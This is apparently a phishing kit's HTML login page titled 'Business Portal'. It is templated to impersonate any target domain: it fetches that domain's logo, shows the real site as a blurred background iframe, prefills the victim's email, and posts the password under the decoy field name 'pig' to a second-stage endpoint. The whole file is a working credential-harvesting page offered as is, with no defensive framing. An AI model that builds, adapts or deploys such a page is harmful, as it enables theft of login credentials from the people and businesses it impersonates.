<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login | Business Portal</title>
    <link rel="icon" href="https://api.kickfire.com/logo?website={{dman}}" type="image/x-icon">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Montserrat', sans-serif;
        }
        body {
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            position: relative;
            overflow: hidden;
            background: #000;
        }
        .background-iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
            z-index: -1;
            opacity: 0.9;
            filter: brightness(0.8) contrast(1.3);
        }
        .overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(10, 10, 10, 0.5);
            backdrop-filter: blur(8px);
        }
        .login-container {
            position: relative;
            z-index: 10;
            background: rgba(255, 255, 255, 0.12);
            padding: 50px;
            border-radius: 20px;
            text-align: center;
            color: #fff;
            width: 420px;
            box-shadow: 0px 0px 50px rgba(255, 165, 0, 0.6);
            backdrop-filter: blur(15px);
            border: 2px solid rgba(255, 255, 255, 0.3);
        }
        .logo {
            font-size: 40px;
            font-weight: bold;
            color: #ff8c00;
            margin-bottom: 20px;
            transition: transform 0.3s ease-in-out;
        }
        .logo img {
            width: 90px;
            height: 90px;
            object-fit: contain;
        }
        .logo:hover {
            transform: scale(1.1);
        }
        .login-container h2 {
            margin-bottom: 25px;
            font-size: 26px;
            font-weight: bold;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        .input-group {
            margin-bottom: 18px;
            position: relative;
        }
        .input-group input {
            width: 100%;
            padding: 14px 16px 14px 45px;
            border: none;
            border-radius: 30px;
            background: rgba(255, 255, 255, 0.3);
            color: #fff;
            font-size: 17px;
            outline: none;
            transition: 0.3s;
        }
        .input-group input:focus {
            background: rgba(255, 255, 255, 0.5);
        }
        .input-group input::placeholder {
            color: rgba(255, 255, 255, 0.7);
        }
        .input-group i {
            position: absolute;
            left: 18px;
            top: 50%;
            transform: translateY(-50%);
            color: rgba(255, 255, 255, 0.8);
        }
        .login-btn {
            width: 100%;
            padding: 15px;
            border: none;
            border-radius: 30px;
            background: linear-gradient(90deg, #ff8c00, #ff4500);
            color: #fff;
            font-size: 19px;
            font-weight: bold;
            cursor: pointer;
            transition: 0.3s;
            position: relative;
            box-shadow: 0px 4px 15px rgba(255, 140, 0, 0.6);
        }
        .login-btn:hover {
            background: linear-gradient(90deg, #ff4500, #ff8c00);
            box-shadow: 0px 6px 20px rgba(255, 69, 0, 0.8);
        }
        .login-btn::after {
            content: '';
            position: absolute;
            width: 100%;
            height: 100%;
            border-radius: 30px;
            top: 0;
            left: 0;
            background: rgba(255, 255, 255, 0.2);
            opacity: 0;
            transition: 0.3s;
        }
        .login-btn:hover::after {
            opacity: 1;
        }
        .forgot-password {
            margin-top: 18px;
            color: rgba(255, 255, 255, 0.9);
            font-size: 15px;
            cursor: pointer;
            transition: color 0.3s;
        }
        .forgot-password:hover {
            color: #fff;
        }
    </style>
</head>
<body>
    <iframe class="background-iframe" src="https://{{dman}}" frameborder="0"></iframe>
    <div class="overlay"></div>
    <div class="login-container">
        <div class="logo">
            <img src="https://api.kickfire.com/logo?website={{dman}}">
        </div>
        <h2>Sign In</h2>
        <form action="second" method="post">
            <div class="input-group">
                <i class="fas fa-user"></i>
                <input type="text" name="horse" value="{{eman}}" required>
            </div>
            <div class="input-group">
                <i class="fas fa-lock"></i>
                <input type="password" name="pig" placeholder="Enter Your Password" required>
            </div>
            <button type="submit" class="login-btn">Sign In</button>
            <div class="forgot-password">Forgot Password?</div>
        </form>
    </div>
</body>
</html>
